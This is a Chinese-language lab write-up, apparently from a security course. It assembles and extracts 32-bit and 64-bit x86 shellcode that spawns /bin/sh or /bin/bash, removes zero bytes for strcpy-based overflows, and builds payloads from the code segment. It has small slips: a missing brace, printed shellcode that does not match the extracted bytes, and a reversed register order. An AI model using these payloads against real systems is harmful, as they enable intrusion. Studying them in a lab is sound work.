# Task 1.a

首先来看一下C语言版本的shellcode：

```c
#include <unistd.h>
int main()
    char *argv[2];
    argv[0]="/bin/sh";
    argv[1]=NULL;
    execve (argv[0],argv,NULL);
	return 0;
}
```

下面汇编代码可以启动一个shell：

```asm
section .text
  global _start
    _start:
      ; Store the argument string on stack
      xor  eax, eax 
      push eax          ; Use 0 to terminate the string
      push "//sh"
      push "/bin"
      mov  ebx, esp     ; Get the string address

      ; Construct the argument array argv[]
      push eax          ; argv[1] = 0
      push ebx          ; argv[0] points "/bin//sh"
      mov  ecx, esp     ; Get the address of argv[]
   
      ; For environment variable 
      xor  edx, edx     ; No env variables 

      ; Invoke execve()
      xor  eax, eax     ; eax = 0x00000000
      mov   al, 0x0b    ; eax = 0x0000000b
      int 0x80
```

几点解释：

- 

使用nasm 编译上面的汇编代码(mysh.s) 

```
$ nasm -f elf32 mysh.s -o mysh.o
```

> nasm 是用于 Intel x86和 x64架构的汇编和反汇编程序。-f elf32选项表明我们希望将代码编译为32位 ELF 二进制格式

掏出程序的生命周期图，可以更好的理解nasm工作原理

![](https://gls.show/image/31h00bitb5.jpg)

通过链接得到可执行文件：

```shell
$ ld -m elf_i386 mysh.o -o mysh
```

可以通过`./mysh`启动shell，然后使用`echo $$`得到目前进程的id，从而验证是否成功开启了shell

接下来，我们需要从可执行文件或目标文件中提取机器代码（machine code）

```shell
$ objdump -Mintel --disassemble mysh.o

mysh.o:     file format elf32-i386


Disassembly of section .text:

00000000 <_start>:
   0:	31 c0                	xor    eax,eax
   2:	50                   	push   eax
   3:	68 2f 2f 73 68       	push   0x68732f2f
   8:	68 2f 62 69 6e       	push   0x6e69622f
   d:	89 e3                	mov    ebx,esp
   f:	50                   	push   eax
  10:	53                   	push   ebx
  11:	89 e1                	mov    ecx,esp
  13:	31 d2                	xor    edx,edx
  15:	31 c0                	xor    eax,eax
  17:	b0 0b                	mov    al,0xb
  19:	cd 80                	int    0x80
```

- -Mintel表示显示Intel格式的汇编代码，而非默认的ATT格式
- --disassemble表示反汇编，也可以使用-d代替

可以使用xxd命令获取二进制序列

```shell
$ xxd -p -c 20 mysh.o

7f454c4601010100000000000000000001000300
0100000000000000000000004000000000000000
3400000000002800050002000000000000000000
0000000000000000000000000000000000000000
0000000000000000000000000000000000000000
0000000001000000010000000600000000000000
100100001b000000000000000000000010000000
0000000007000000030000000000000000000000
3001000021000000000000000000000001000000
0000000011000000020000000000000000000000
6001000040000000040000000300000004000000
1000000019000000030000000000000000000000
a00100000f000000000000000000000001000000
00000000000000000000000031c050682f2f7368
682f62696e89e3505389e131d231c0b00bcd8000
00000000002e74657874002e7368737472746162
002e73796d746162002e73747274616200000000
0000000000000000000000000000000000000000
0000000000000000010000000000000000000000
0400f1ff00000000000000000000000003000100
08000000000000000000000010000100006d7973
682e73005f73746172740000
```

- -p表示列之间不需要空格
- -c 20表示一行有20个字符

提取出我们需要的二进制序列：

```
31c050682f2f7368
682f62696e89e3505389e131d231c0b00bcd80
```

可以使用conver.py得到二进制数组

```shell 
$ ./convert.py
Length of the shellcode: 35
shellcode= (
    "\x31\xdb\x31\xc0\xb0\xd5\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    "\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0"
    "\x0b\xcd\x80"
).encode(’latin-1’)
```

# Task 1.b

> Shellcode 广泛应用于缓冲区溢出攻击。在许多情况下，漏洞是由字符串复制引起的，例如 strcpy ()函数。对于这些字符串复制函数，零被认为是字符串的末尾。因此，如果我们在 shell 代码的中间有一个零，字符串复制将不能将零后面的任何内容从这个 shell 代码复制到目标缓冲区，因此攻击将不能成功

因此我们有必要将上面二进制序列的0去除

一些去0的方法：

- 使用`xor eax，eax`去取代`mov eax, 0`

- 如果我们要存储0x0000099到 eax。我们不能只使用 mov eax，0x99，因为第二个操作数实际上是0x0000099，它包含三个零

  - 首先将 eax 设置为零，然后为 al 寄存器分配一个1字节的数字0x99

- 使用移位操作

  - 下面操作等价于将`xyz\0`赋给ebx

  ```asm
  mov ebx, "xyz#"
  shl ebx, 8
  shr ebx, 8
  ```

接下来到了第一个任务，我们需要执行/bin/bash，并且不可以有多余的/

```asm
section .text

  global _start
    _start:
      ; Store the argument string on stack
      xor  eax, eax
      push eax          ; Use 0 to terminate the string
        mov ebx,"hhhh"
        shl ebx, 24
        shr ebx, 24
        push ebx
      push "/bas"
      push "/bin"
      mov  ebx, esp     ; Get the string address
      ; Construct the argument array argv[]
      push eax          ; argv[1] = 0
      push ebx          ; argv[0] points "/bin//sh"
      mov  ecx, esp     ; Get the address of argv[]

      ; For environment variable 
      xor  edx, edx     ; No env variables 

      ; Invoke execve()
      xor  eax, eax     ; eax = 0x00000000
      mov   al, 0x0b    ; eax = 0x0000000b
      int 0x80

```

- 我们需要构造出/bin/bash\0的字符串
- 由于直接使用0会导致strcpy失败，因此可以使用移位操作获取0
- 注意到push的操作数只能是32位/64数

反汇编看一下结果，没有0字节

```
00000000 <_start>:
   0:	31 c0                	xor    eax,eax
   2:	50                   	push   eax
   3:	bb 68 68 68 68       	mov    ebx,0x68686868
   8:	c1 e3 18             	shl    ebx,0x18
   b:	c1 eb 18             	shr    ebx,0x18
   e:	53                   	push   ebx
   f:	68 2f 62 61 73       	push   0x7361622f
  14:	68 2f 62 69 6e       	push   0x6e69622f
  19:	89 e3                	mov    ebx,esp
  1b:	50                   	push   eax
  1c:	53                   	push   ebx
  1d:	89 e1                	mov    ecx,esp
  1f:	31 d2                	xor    edx,edx
  21:	31 c0                	xor    eax,eax
  23:	b0 0b                	mov    al,0xb
  25:	cd 80                	int    0x80
```

# Task 1.c

使用execve实现以下命令的执行：

```shell
/bin/sh -c "ls -la"
```

汇编代码：

```asm
section .text
  global _start
    _start:
      ; Store the argument string on stack
      xor  eax, eax
      push eax          ; Use 0 to terminate the string
      push "//sh"
      push "/bin"
      mov  ebx, esp     ; Get the string address

      ; Construct the argument array argv[]
        push eax

        mov eax,"##al"
        shr eax,16
        push eax

        mov eax,"ls -"
        push eax
        mov  ecx,esp ;store ls -al into ecx

        xor eax,eax
        push eax
        mov eax,"##-c"
        shr eax,16
        push eax
        mov edx,esp ;store -c into edx

        xor eax,eax
        push eax ; 0 terminate
        push ecx ; ls -al
        push edx ; -c 
        push ebx ; /bin/sh
        mov ecx,esp

      ; For environment variable 
      xor  edx, edx     ; No env variables 

      ; Invoke execve()
      xor  eax, eax     ; eax = 0x00000000
      mov   al, 0x0b    ; eax = 0x0000000b
      int 0x80

```

> Invoking execve(“/bin/sh”, argv, 0)
>
> –**eax** = 0x0b: execve() system call number
>
> –**ebx** = address of the command string “/bin/sh”
>
> –**ecx** = address of the argument array argv
>
> –**edx** = address of environment variables (set to 0)

# Task 2: Using Code Segment

```asm
section .text
  global _start
    _start:
      
      	BITS 32
        jmp short two
   
   	one:
        pop ebx ; ebx储存字符串地址
        xor eax, eax ; 将eax置为0
        mov [ebx+7], al ;将al，也即是0替换*
        mov [ebx+8], ebx  ;将字符串的地址赋给AAAA所在的内存处(4 bytes)
        mov [ebx+12], eax ; 将0赋给BBBB所在内存处
        lea ecx, [ebx+8] ; ecx=ebx+8，也即是ecx储存/bin/sh\0的地址
        xor edx, edx ;edx为0，表示无环境变量
        mov al,  0x0b ;系统调用号
        int 0x80
        
    two:
        call one
        db '/bin/sh*AAAABBBB' 
```

程序的几点解释

- 详见注释

- 程序先跳到two
- two通过call指令调用one函数，这样的话，会将返回地址，也即是`'/bin/sh*AAAABBBB' `压入栈中，后面就可以使用pop ebx储存字符串地址

为何可以触发shell：

- edx为0，表示无环境变量
- ecx储存/bin/sh\0的地址
- ebx储存db字符串地址

**执行/usr/bin/env，并且打印出环境变量**

```asm
section .text
  global _start
    _start:
        BITS 32
        jmp short two
    one:
        pop ebx
        xor eax, eax

        ;the next 4 lines converse # into 0
        mov [ebx+12], al
        mov [ebx+15], al
        mov [ebx+20], al
        mov [ebx+25], al

        mov [ebx+26],ebx ;put address of "/usr/bin/env\0" to where AAAA is

        lea eax,[ebx+13]
        mov [ebx+30],eax ;put address of "-i\0" to where BBBB is 

        lea eax,[ebx+16]
        mov [ebx+34],eax ;put address of "a=11\0" to where CCCC is

        lea eax,[ebx+21]
        mov [ebx+38],eax ;put address of "b=22\0" to where DDDD is

        xor eax,eax
        mov [ebx+42],eax ;0 terminate

        ; now ebx point to "/usr/bin/env\0"     

        lea ecx, [ebx+26] ;put address of "/usr/bin/env -i a=11 b=22" to ecx 

        xor edx,edx ; edx = 0 

        mov al,  0x0b
        int 0x80
     two:
        call one
        db '/usr/bin/env#-i#a=11#b=22#AAAABBBBCCCCDDDDEEEE'
           ;012345678901234567890123456789012345678901234567890
           ;          1         2         3         4    
```

- 代码和详细注释见上面
- '/usr/bin/env#-i#a=11#b=22#AAAABBBBCCCCDDDDEEEE'是我们构造的字符串，通过call + pop指令可以获取该地址
  - #是占位符。为了防止0导致strcpy无法复制字符串，这里使用#作为占位符，后面会用al进行替换
- `/usr/bin/env -i a=11 b=22`是我们要执行的命令（一定要注意到字符串最后有个\0）
  - ecx存储argv的地址，因此指向ebx+26
  - ebx存储“/usr/bin/env\0”的地址

```shell
mysh2: mysh2.s
	nasm -f elf32 $@.s -o $@.o
	ld --omagic -m elf_i386 $@.o -o $@
```

编译执行，运行了新的shell（omagic 选项使得代码段是可写的）

# Task 3: Writing 64-bit Shellcode

我们的任务是在64位的情况下执行`/bin/bash`

注意到64位和32位的不同：

- 对于 x64架构，调用系统调用是通过 syscall 指令完成的
- 系统调用的前三个参数分别存储在 rdx、 rsi 和 rdi 寄存器中



```asm
section .text
  global _start
    _start:
      ; The following code calls execve("/bin/sh", ...)
      xor  rdx, rdx       ; 3rd argument
      push rdx
        mov rax,"h#######"
        shl rax,56
        shr rax,56
        push rax
      mov rax,'/bin/bas'
      push rax
      mov rdi, rsp        ; 1st argument
      push rdx ; 重点是这两行
      push rdi 
      mov rsi, rsp        ; 2nd argument
      xor  rax, rax
      mov al, 0x3b        ; execve()
      syscall
```

几点需要注意的：

- rax是系统调用号，这里执行execve
- rdi储存`/bin/bash\0`的地址
- rdx是0

objdump一下，发现确实没有0字节

```asm
$ objdump -Mintel -d mysh_64

mysh_64:     file format elf64-x86-64


Disassembly of section .text:

0000000000401000 <_start>:
  401000:	48 31 d2             	xor    rdx,rdx
  401003:	52                   	push   rdx
  401004:	48 b8 68 23 23 23 23 	movabs rax,0x2323232323232368
  40100b:	23 23 23 
  40100e:	48 c1 e0 38          	shl    rax,0x38
  401012:	48 c1 e8 38          	shr    rax,0x38
  401016:	50                   	push   rax
  401017:	48 b8 2f 62 69 6e 2f 	movabs rax,0x7361622f6e69622f
  40101e:	62 61 73 
  401021:	50                   	push   rax
  401022:	48 89 e7             	mov    rdi,rsp
  401025:	52                   	push   rdx
  401026:	57                   	push   rdi
  401027:	48 89 e6             	mov    rsi,rsp
  40102a:	48 31 c0             	xor    rax,rax
  40102d:	b0 3b                	mov    al,0x3b
  40102f:	0f 05                	syscall 

```

